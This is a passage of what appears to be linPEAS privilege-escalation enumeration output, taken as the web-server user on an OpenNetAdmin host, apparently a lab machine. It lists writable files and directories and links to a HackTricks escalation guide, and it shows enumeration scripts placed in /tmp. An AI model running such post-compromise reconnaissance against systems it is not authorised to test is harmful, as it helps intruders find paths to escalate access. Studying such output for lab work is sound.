+/opt/ona/www/winc/app_about.inc.php
+/opt/ona/www/winc/app_admin_tools.inc.php
+/opt/ona/www/winc/app_advanced_search.inc.php
+/opt/ona/www/winc/app_config_type_edit.inc.php
+/opt/ona/www/winc/app_config_type_list.inc.php
+/opt/ona/www/winc/app_custom_attribute_type_edit.inc.php
+/opt/ona/www/winc/app_custom_attribute_type_list.inc.php
+/opt/ona/www/winc/app_device_model_edit.inc.php
+/opt/ona/www/winc/app_device_model_list.inc.php
+/opt/ona/www/winc/app_device_role_edit.inc.php
+#)You_can_write_even_more_files_inside_last_directory
+/opt/ona/www/workspace_plugins
+/opt/ona/www/workspace_plugins/builtin
+/opt/ona/www/workspace_plugins/builtin/config_archives
+/opt/ona/www/workspace_plugins/builtin/config_archives/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/custom_attributes
+/opt/ona/www/workspace_plugins/builtin/custom_attributes/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/desktop_counts
+/opt/ona/www/workspace_plugins/builtin/desktop_counts/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/desktop_firsttasks
+/opt/ona/www/workspace_plugins/builtin/desktop_firsttasks/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/desktop_versioncheck
+/opt/ona/www/workspace_plugins/builtin/desktop_versioncheck/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/dhcp_entries
+/opt/ona/www/workspace_plugins/builtin/dhcp_entries/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/dhcp_pools
+/opt/ona/www/workspace_plugins/builtin/dhcp_pools/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/dhcp_servers
+/opt/ona/www/workspace_plugins/builtin/dhcp_servers/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/host_actions
+/opt/ona/www/workspace_plugins/builtin/host_actions/config.inc.php
+/opt/ona/www/workspace_plugins/builtin/host_actions/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/host_detail
+/opt/ona/www/workspace_plugins/builtin/host_detail/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/host_services
+/opt/ona/www/workspace_plugins/builtin/host_services/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/location_detail
+/opt/ona/www/workspace_plugins/builtin/location_detail/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/messages
+/opt/ona/www/workspace_plugins/builtin/messages/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/reports
+/opt/ona/www/workspace_plugins/builtin/reports/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/subnet_detail
+/opt/ona/www/workspace_plugins/builtin/subnet_detail/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/subnet_map
+/opt/ona/www/workspace_plugins/builtin/subnet_map/main.inc.php
+/run/lock
+/run/lock/apache2
+/run/screen
+/run/screen/S-www-data
+/snap/core/7270/run/lock
+/snap/core/7270/tmp
+/snap/core/7270/var/tmp
+/snap/core/8039/run/lock
+/snap/core/8039/tmp
+/snap/core/8039/var/tmp
+/tmp
+/tmp/linpeas.sh
+/tmp/lse.sh
+/tmp/tmux-33
+/var/cache/apache2/mod_cache_disk
+/var/crash
+/var/lib/lxcfs/cgroup/memory/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/open-vm-tools.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-7270.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-8039.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/swap.img.swap/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/uuidd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/vgauth.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
+/var/lib/php/sessions
+/var/log/ona.log
+/var/tmp
+/var/www/html
+/var/www/html/artwork
+/var/www/html/artwork/.DS_Store
+/var/www/html/artwork/about.html
+/var/www/html/artwork/blog.html
+/var/www/html/artwork/contact.html
+/var/www/html/artwork/css
+/var/www/html/artwork/css/.DS_Store
+/var/www/html/artwork/css/aos.css
+/var/www/html/artwork/css/bootstrap
+/var/www/html/artwork/css/bootstrap-datepicker.css
+/var/www/html/artwork/css/bootstrap.min.css
+/var/www/html/artwork/css/bootstrap.min.css.map
+/var/www/html/artwork/css/bootstrap/bootstrap-grid.css
+/var/www/html/artwork/css/bootstrap/bootstrap-reboot.css
+/var/www/html/artwork/css/bootstrap/bootstrap.css
+/var/www/html/artwork/css/jquery-ui.css
+/var/www/html/artwork/css/jquery.fancybox.min.css
+/var/www/html/artwork/css/magnific-popup.css
+/var/www/html/artwork/css/mediaelementplayer.css
+/var/www/html/artwork/css/owl.carousel.min.css
+/var/www/html/artwork/css/owl.theme.default.min.css
+/var/www/html/artwork/css/style.css
+/var/www/html/artwork/fonts
+/var/www/html/artwork/fonts/.DS_Store
+/var/www/html/artwork/fonts/flaticon
+/var/www/html/artwork/fonts/flaticon/backup.txt
+/var/www/html/artwork/fonts/flaticon/font
+/var/www/html/artwork/fonts/flaticon/font/Flaticon.eot
+/var/www/html/artwork/fonts/flaticon/font/Flaticon.svg
+/var/www/html/artwork/fonts/flaticon/font/Flaticon.ttf
+/var/www/html/artwork/fonts/flaticon/font/Flaticon.woff
+/var/www/html/artwork/fonts/flaticon/font/Flaticon.woff2
+/var/www/html/artwork/fonts/flaticon/font/_flaticon.scss
+/var/www/html/artwork/fonts/flaticon/font/flaticon.css
+/var/www/html/artwork/fonts/flaticon/font/flaticon.html
+/var/www/html/artwork/fonts/flaticon/license
+/var/www/html/artwork/fonts/icomoon
+/var/www/html/artwork/fonts/icomoon/Read Me.txt
+/var/www/html/artwork/fonts/icomoon/demo-files
+/var/www/html/artwork/fonts/icomoon/demo-files/demo.css
+/var/www/html/artwork/fonts/icomoon/demo-files/demo.js
+/var/www/html/artwork/fonts/icomoon/demo.html
+/var/www/html/artwork/fonts/icomoon/fonts
+/var/www/html/artwork/fonts/icomoon/fonts/icomoon.eot
+/var/www/html/artwork/fonts/icomoon/fonts/icomoon.svg
+/var/www/html/artwork/fonts/icomoon/fonts/icomoon.ttf
+/var/www/html/artwork/fonts/icomoon/fonts/icomoon.woff
+/var/www/html/artwork/fonts/icomoon/selection.json
+/var/www/html/artwork/fonts/icomoon/style.css
+/var/www/html/artwork/images
+/var/www/html/artwork/images/.DS_Store
+/var/www/html/artwork/index.html
+/var/www/html/artwork/js
+/var/www/html/artwork/js/aos.js
+/var/www/html/artwork/js/bootstrap-datepicker.min.js
+/var/www/html/artwork/js/bootstrap.min.js
+/var/www/html/artwork/js/isotope.pkgd.min.js
+/var/www/html/artwork/js/jquery-3.3.1.min.js
+/var/www/html/artwork/js/jquery-migrate-3.0.0.js
+/var/www/html/artwork/js/jquery-migrate-3.0.1.min.js
+/var/www/html/artwork/js/jquery-ui.js
+/var/www/html/artwork/js/jquery.animateNumber.min.js
+/var/www/html/artwork/js/jquery.countdown.min.js
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/artwork/main.html
+/var/www/html/artwork/prepros-6.config
+/var/www/html/artwork/readme.txt
+/var/www/html/artwork/scss
+/var/www/html/artwork/scss/.DS_Store
+/var/www/html/artwork/scss/_site-base.scss
+/var/www/html/artwork/scss/_site-blocks.scss
+/var/www/html/artwork/scss/_site-navbar.scss
+/var/www/html/artwork/scss/bootstrap
+/var/www/html/artwork/scss/bootstrap/.DS_Store
+/var/www/html/artwork/scss/bootstrap/_alert.scss
+/var/www/html/artwork/scss/bootstrap/_badge.scss
+/var/www/html/artwork/scss/bootstrap/_breadcrumb.scss
+/var/www/html/artwork/scss/bootstrap/_button-group.scss
+/var/www/html/artwork/scss/bootstrap/_buttons.scss
+/var/www/html/artwork/scss/bootstrap/_card.scss
+/var/www/html/artwork/scss/bootstrap/_carousel.scss
+/var/www/html/artwork/scss/bootstrap/_close.scss
+/var/www/html/artwork/scss/bootstrap/_code.scss
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/artwork/scss/bootstrap/mixins/_alert.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_background-variant.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_badge.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_border-radius.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_box-shadow.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_breakpoints.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_buttons.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_caret.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_clearfix.scss
+/var/www/html/artwork/scss/bootstrap/mixins/_deprecate.scss
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/artwork/scss/bootstrap/utilities
+/var/www/html/artwork/scss/bootstrap/utilities/_align.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_background.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_borders.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_clearfix.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_display.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_embed.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_flex.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_float.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_overflow.scss
+/var/www/html/artwork/scss/bootstrap/utilities/_position.scss
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/artwork/scss/bootstrap/vendor
+/var/www/html/artwork/scss/bootstrap/vendor/_rfs.scss
+/var/www/html/artwork/scss/style.scss
+/var/www/html/artwork/services.html
+/var/www/html/artwork/single.html
+/var/www/html/index.html
+/var/www/html/marga
+/var/www/html/marga/.DS_Store
+/var/www/html/marga/.git
+/var/www/html/marga/.git/COMMIT_EDITMSG
+/var/www/html/marga/.git/HEAD
+/var/www/html/marga/.git/branches
+/var/www/html/marga/.git/config
+/var/www/html/marga/.git/description
+/var/www/html/marga/.git/hooks
+/var/www/html/marga/.git/hooks/applypatch-msg.sample
+/var/www/html/marga/.git/hooks/commit-msg.sample
+/var/www/html/marga/.git/hooks/fsmonitor-watchman.sample
+/var/www/html/marga/.git/hooks/post-update.sample
+/var/www/html/marga/.git/hooks/pre-applypatch.sample
+/var/www/html/marga/.git/hooks/pre-commit.sample
+/var/www/html/marga/.git/hooks/pre-push.sample
+/var/www/html/marga/.git/hooks/pre-rebase.sample
+/var/www/html/marga/.git/hooks/pre-receive.sample
+/var/www/html/marga/.git/hooks/prepare-commit-msg.sample
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/marga/.git/index
+/var/www/html/marga/.git/info
+/var/www/html/marga/.git/info/exclude
+/var/www/html/marga/.git/logs
+/var/www/html/marga/.git/logs/HEAD
+/var/www/html/marga/.git/logs/refs
+/var/www/html/marga/.git/logs/refs/heads
+/var/www/html/marga/.git/logs/refs/heads/master
+/var/www/html/marga/.git/logs/refs/remotes
+/var/www/html/marga/.git/logs/refs/remotes/server
+/var/www/html/marga/.git/logs/refs/remotes/server/master
+/var/www/html/marga/.git/objects
+/var/www/html/marga/.git/objects/02
+/var/www/html/marga/.git/objects/02/ff781c748920883ac08665bf0949f2e60d1f50
+/var/www/html/marga/.git/objects/04
+/var/www/html/marga/.git/objects/04/b8e12aaffcb43bd104cb05cbebebec0022d7c8
+/var/www/html/marga/.git/objects/04/f1581b339bd1688b64ae66e2d70789e3f4eaed
+/var/www/html/marga/.git/objects/05
+/var/www/html/marga/.git/objects/05/a9423409eeed75c28e04c842ef56a95670d1bc
+/var/www/html/marga/.git/objects/08
+/var/www/html/marga/.git/objects/08/492ab0c5c5c64e803803d66aa3463e311e628a
+/var/www/html/marga/.git/objects/0a
+/var/www/html/marga/.git/objects/0a/441038db16484658bc35923b9114f834b393bb
+/var/www/html/marga/.git/objects/0e
+/var/www/html/marga/.git/objects/0e/b84502400d912e39d60f11773661f990add090
+/var/www/html/marga/.git/objects/0f
+/var/www/html/marga/.git/objects/0f/e102f57c0ea5634009fbab72783347a3c82992
+/var/www/html/marga/.git/objects/10
+/var/www/html/marga/.git/objects/10/274a6890f97d6668c2feae59b9d803f7f0b097
+/var/www/html/marga/.git/objects/13
+/var/www/html/marga/.git/objects/13/e7a83556e0314eef640b7877850aa4d2e7c520
+/var/www/html/marga/.git/objects/15
+/var/www/html/marga/.git/objects/15/a08ac5bda9ba4b30896a29647c90c93fb2aeb6
+/var/www/html/marga/.git/objects/16
+/var/www/html/marga/.git/objects/16/04d0dfd13c7153fd5bcf20627aae9fba5a4aa9
+/var/www/html/marga/.git/objects/16/5bfbb195618c35453bec417ba9f55b1458d4fa
+/var/www/html/marga/.git/objects/17
+/var/www/html/marga/.git/objects/17/b544984106d4a9775436ae05b9df98c3ba129c
+/var/www/html/marga/.git/objects/1c
+/var/www/html/marga/.git/objects/1c/eabd83b112585248b225d7f7a5e402c3d4c30a
+/var/www/html/marga/.git/objects/1e
+/var/www/html/marga/.git/objects/1e/ce042ac23a93193597167153b7373b7ff28e62
+/var/www/html/marga/.git/objects/1f
+/var/www/html/marga/.git/objects/1f/3d89afdde4274b006c375e39fafbf011951d92
+/var/www/html/marga/.git/objects/20
+/var/www/html/marga/.git/objects/20/87cd23541a7485f5cc53394466d68f94c4008d
+/var/www/html/marga/.git/objects/27
+/var/www/html/marga/.git/objects/27/0c9d65d309bc8e36cdeaa9fef067373058a693
+/var/www/html/marga/.git/objects/27/f9c9bc19a6bc3fb1f58edccc9b7285d8b9712f
+/var/www/html/marga/.git/objects/29
+/var/www/html/marga/.git/objects/29/43e7caec3193471183bd53e82293d5f630f131
+/var/www/html/marga/.git/objects/2b
+/var/www/html/marga/.git/objects/2b/2d5975e70dbc0588a3440b8c0480cb07a951a1
+/var/www/html/marga/.git/objects/2b/3fc8e54d550bbbbe0dc5525ddb43de6e047633
+/var/www/html/marga/.git/objects/2d
+/var/www/html/marga/.git/objects/2d/37d780aeec9be7cb3cabdf00c3efd6be5e2273
+/var/www/html/marga/.git/objects/30
+/var/www/html/marga/.git/objects/30/e8b34000b52fe5bc00c4007be6f2f50cba28b6
+/var/www/html/marga/.git/objects/32
+/var/www/html/marga/.git/objects/32/f42b9ec1c87efe836b1082cb762c6185fd453f
+/var/www/html/marga/.git/objects/35
+/var/www/html/marga/.git/objects/35/2a9b2355298234a9a5e7b158e95617e7476968
+/var/www/html/marga/.git/objects/35/e9edb1a2f30dc8e858203ae814a81aadebd314
+/var/www/html/marga/.git/objects/36
+/var/www/html/marga/.git/objects/36/711ba693f1b9727b58c16ed044fc6e8959bf62
+/var/www/html/marga/.git/objects/42
+/var/www/html/marga/.git/objects/42/172c2f6ed2f683fe898bdc4291b323ef563312
+/var/www/html/marga/.git/objects/44
+/var/www/html/marga/.git/objects/44/de7d31f669d417768088fb264cc06c065a22db
+/var/www/html/marga/.git/objects/46
+/var/www/html/marga/.git/objects/46/7c298efc453a808755b990d71fee0bf49fe25a
+/var/www/html/marga/.git/objects/48
+/var/www/html/marga/.git/objects/48/cb452717b4dfb4f4c1985553eebfa5d40baa07
+/var/www/html/marga/.git/objects/49
+/var/www/html/marga/.git/objects/49/d1fcfbe21c48a65f5037ab83172fa6dd03ba30
+/var/www/html/marga/.git/objects/4b
+/var/www/html/marga/.git/objects/4b/95305c9f0b1e161b990739a22ad44b3ea860da
+/var/www/html/marga/.git/objects/4d
+/var/www/html/marga/.git/objects/4d/16fa65ff70e4520e27a1c22280ef3ff503e2aa
+/var/www/html/marga/.git/objects/4d/e96b471e7eaa6451d2470f2a100420b7aaf8aa
+/var/www/html/marga/.git/objects/4f
+
+[+] Interesting GROUP writable files (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group www-data:
+grep: write error: Broken pipe
+/opt/ona/docs
+/opt/ona/docs/LICENSE
+/opt/ona/docs/UPGRADES
+/opt/ona/docs/INSTALL
+/opt/ona/docs/DEVELOPERS
+/opt/ona/docs/CODING_STANDARDS
+/opt/ona/etc
+/opt/ona/etc/README
+/opt/ona/bin
+/opt/ona/bin/README
+/opt/ona/README.md
+/opt/ona/sql
+/opt/ona/sql/EXAMPLE.sql.disable
+/opt/ona/sql/list_all_hosts.sql
+/opt/ona/www
+/opt/ona/www/plugins
+/opt/ona/www/plugins/README
+/opt/ona/www/plugins/ona_nmap_scans
+/opt/ona/www/plugins/ona_nmap_scans/report.inc.php
+/opt/ona/www/plugins/ona_nmap_scans/plugin_info.php
+/opt/ona/www/plugins/ona_nmap_scans/nmap.xsl
+/opt/ona/www/plugins/ona_nmap_scans/report_item.inc.php
+/opt/ona/www/plugins/ona_nmap_scans/nmap_scan_cron
+/opt/ona/www/plugins/ona_nmap_scans/ona_nmap_scans.inc.php
+/opt/ona/www/plugins/ona_nmap_scans/sql
+/opt/ona/www/plugins/ona_nmap_scans/sql/nmap_subnets_only_yes.sql
+/opt/ona/www/plugins/ona_nmap_scans/sql/check_last_response.sql
+/opt/ona/www/plugins/ona_nmap_scans/sql/nmap_subnets.sql
+/opt/ona/www/plugins/ona_nmap_scans/install.php
+/opt/ona/www/images
+/opt/ona/www/images/silk
+/opt/ona/www/images/silk/readme.txt
+/opt/ona/www/images/silk/icons
+/opt/ona/www/images/silk/readme.html
+/opt/ona/www/include
+/opt/ona/www/include/xajax_0.2.4
+/opt/ona/www/include/xajax_0.2.4/README.txt
+/opt/ona/www/include/xajax_0.2.4/xajax.inc.php
+/opt/ona/www/include/xajax_0.2.4/xajax_js
+/opt/ona/www/include/xajax_0.2.4/xajax_js/xajax_uncompressed.js
+/opt/ona/www/include/xajax_0.2.4/xajax_js/xajax.js
+/opt/ona/www/include/xajax_0.2.4/xajaxResponse.inc.php
+/opt/ona/www/include/xajax_0.2.4/LICENSE.txt
+/opt/ona/www/include/xajax_0.2.4/xajaxCompress.php
+/opt/ona/www/include/xajax_drag
+/opt/ona/www/include/xajax_drag/drag.inc.php
+/opt/ona/www/include/xajax_drag/drag.js
+/opt/ona/www/include/js
+/opt/ona/www/include/js/global.js
+/opt/ona/www/include/js/bignumber.js
+/opt/ona/www/include/functions_network_map.inc.php
+/opt/ona/www/include/DifferenceEngine.php
+/opt/ona/www/include/html_style_sheet.inc.php
+/opt/ona/www/include/xajax_suggest
+/opt/ona/www/include/xajax_suggest/suggest.js
+/opt/ona/www/include/xajax_suggest/suggest.css
+/opt/ona/www/include/xajax_suggest/suggest.inc.php
+/opt/ona/www/include/html_desktop.inc.php
+/opt/ona/www/include/adodb5
+/opt/ona/www/include/adodb5/LICENSE.md
+/opt/ona/www/include/adodb5/adodb-memcache.lib.inc.php
+/opt/ona/www/include/adodb5/adodb-xmlschema03.inc.php
+/opt/ona/www/include/adodb5/server.php
+/opt/ona/www/include/adodb5/datadict
+/opt/ona/www/include/adodb5/datadict/datadict-mssqlnative.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-generic.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-mysql.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-db2.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-sybase.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-firebird.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-ibase.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-sqlite.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-access.inc.php
+/opt/ona/www/include/adodb5/datadict/datadict-mssql.inc.php
+#)You_can_write_even_more_files_inside_last_directory
+/opt/ona/www/include/adodb5/adodb-errorhandler.inc.php
+/opt/ona/www/include/adodb5/adodb-time.inc.php
+/opt/ona/www/include/adodb5/composer.json
+/opt/ona/www/include/adodb5/adodb-csvlib.inc.php
+/opt/ona/www/include/adodb5/adodb-active-record.inc.php
+/opt/ona/www/include/adodb5/adodb-errorpear.inc.php
+/opt/ona/www/include/adodb5/adodb-xmlschema.inc.php
+/opt/ona/www/include/adodb5/README.md
+/opt/ona/www/include/adodb5/drivers
+/opt/ona/www/include/adodb5/drivers/adodb-csv.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-mssql.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-ado.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-mssql_n.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-ado_access.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-pdo_mssql.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-fbsql.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-db2.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-pdo_pgsql.inc.php
+/opt/ona/www/include/adodb5/drivers/adodb-borland_ibase.inc.php
+#)You_can_write_even_more_files_inside_last_directory
+/opt/ona/www/include/adodb5/xmlschema03.dtd
+/opt/ona/www/include/adodb5/.mailmap
+/opt/ona/www/include/adodb5/xsl
+/opt/ona/www/include/adodb5/xsl/convert-0.1-0.2.xsl
+/opt/ona/www/include/adodb5/xsl/remove-0.2.xsl
+/opt/ona/www/include/adodb5/xsl/convert-0.2-0.1.xsl
+/opt/ona/www/include/adodb5/xsl/convert-0.2-0.3.xsl
+/opt/ona/www/include/adodb5/xsl/convert-0.1-0.3.xsl
+/opt/ona/www/include/adodb5/xsl/remove-0.3.xsl
+/opt/ona/www/include/adodb5/rsfilter.inc.php
+/opt/ona/www/include/adodb5/adodb-active-recordx.inc.php
+/opt/ona/www/include/adodb5/adodb-lib.inc.php
+/opt/ona/www/include/adodb5/adodb-exceptions.inc.php
+/opt/ona/www/include/adodb5/xmlschema.dtd
+/opt/ona/www/include/adodb5/adodb-error.inc.php
+/opt/ona/www/include/adodb5/toexport.inc.php
+/opt/ona/www/include/adodb5/tohtml.inc.php
+/opt/ona/www/include/adodb5/adodb-php4.inc.php
+/opt/ona/www/include/adodb5/pivottable.inc.php
+#)You_can_write_even_more_files_inside_last_directory
+/opt/ona/www/include/adodb5/lang/adodb-pt-br.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-cz.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-fr.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-cn.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-ro.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-sv.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-ar.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-es.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-ca.inc.php
+/opt/ona/www/include/adodb5/lang/adodb-uk.inc.php
+#)You_can_write_even_more_files_inside_last_directory
+/opt/ona/www/include/adodb5/adodb-datadict.inc.php
+/opt/ona/www/include/unknown_module_msg.inc.php
+/opt/ona/www/include/functions_general.inc.php
+/opt/ona/www/include/xajax_setup.inc.php
+/opt/ona/www/include/functions_auth.inc.php
+/opt/ona/www/include/functions_db.inc.php
+/opt/ona/www/include/auth
+/opt/ona/www/include/auth/ldap.class.php
+/opt/ona/www/include/auth/local.class.php
+/opt/ona/www/include/xajax_webwin
+/opt/ona/www/include/xajax_webwin/webwin.js
+/opt/ona/www/include/xajax_webwin/webwin.inc.php
+/opt/ona/www/include/xajax_webwin/webwinTT.js
+/opt/ona/www/include/xajax_webwin/webwin.css
+/opt/ona/www/include/functions_gui.inc.php
+/opt/ona/www/include/adodb_sessions.inc.php
+/opt/ona/www/config
+/opt/ona/www/config/auth_ldap.config.php
+/opt/ona/www/config/config.inc.php
+/opt/ona/www/.htaccess.example
+/opt/ona/www/dcm.php
+/opt/ona/www/local
+/opt/ona/www/local/plugins
+/opt/ona/www/local/plugins/README
+/opt/ona/www/local/config
+/opt/ona/www/local/config/motd.txt.example
+/opt/ona/www/local/nmap_scans
+/opt/ona/www/local/nmap_scans/subnets
+/opt/ona/www/local/nmap_scans/subnets/nmap.xsl
+/opt/ona/www/winc
+/opt/ona/www/winc/list_configs.inc.php
+/opt/ona/www/winc/app_about.inc.php
+/opt/ona/www/winc/app_config_type_edit.inc.php
+/opt/ona/www/winc/app_admin_tools.inc.php
+/opt/ona/www/winc/display_domain_server.inc.php
+/opt/ona/www/winc/app_device_type_edit.inc.php
+/opt/ona/www/winc/app_dns_view_edit.inc.php
+/opt/ona/www/winc/app_plugin_list.inc.php
+/opt/ona/www/winc/edit_vlan.inc.php
+/opt/ona/www/winc/list_blocks.inc.php
+#)You_can_write_even_more_files_inside_last_directory
+/opt/ona/www/workspace_plugins
+/opt/ona/www/workspace_plugins/builtin
+/opt/ona/www/workspace_plugins/builtin/desktop_counts
+/opt/ona/www/workspace_plugins/builtin/desktop_counts/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/location_detail
+/opt/ona/www/workspace_plugins/builtin/location_detail/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/custom_attributes
+/opt/ona/www/workspace_plugins/builtin/custom_attributes/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/config_archives
+/opt/ona/www/workspace_plugins/builtin/config_archives/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/host_actions
+/opt/ona/www/workspace_plugins/builtin/host_actions/config.inc.php
+/opt/ona/www/workspace_plugins/builtin/host_actions/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/dhcp_entries
+/opt/ona/www/workspace_plugins/builtin/dhcp_entries/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/subnet_detail
+/opt/ona/www/workspace_plugins/builtin/subnet_detail/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/messages
+/opt/ona/www/workspace_plugins/builtin/messages/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/host_services
+/opt/ona/www/workspace_plugins/builtin/host_services/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/desktop_versioncheck
+/opt/ona/www/workspace_plugins/builtin/desktop_versioncheck/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/subnet_map
+/opt/ona/www/workspace_plugins/builtin/subnet_map/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/host_detail
+/opt/ona/www/workspace_plugins/builtin/host_detail/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/dhcp_pools
+/opt/ona/www/workspace_plugins/builtin/dhcp_pools/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/reports
+/opt/ona/www/workspace_plugins/builtin/reports/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/desktop_firsttasks
+/opt/ona/www/workspace_plugins/builtin/desktop_firsttasks/main.inc.php
+/opt/ona/www/workspace_plugins/builtin/dhcp_servers
+/opt/ona/www/workspace_plugins/builtin/dhcp_servers/main.inc.php
+/opt/ona/www/logout.php
+/opt/ona/www/config_dnld.php
+/opt/ona/www/login.php
+/opt/ona/www/modules
+/opt/ona/www/modules/sql.inc.php
+/opt/ona/www/modules/ipcalc.inc.php
+/opt/ona/www/modules/mysql_purge_logs.inc.php
+/opt/ona/www/modules/report_run.inc.php
+/opt/ona/www/modules/get_module_list.inc.php
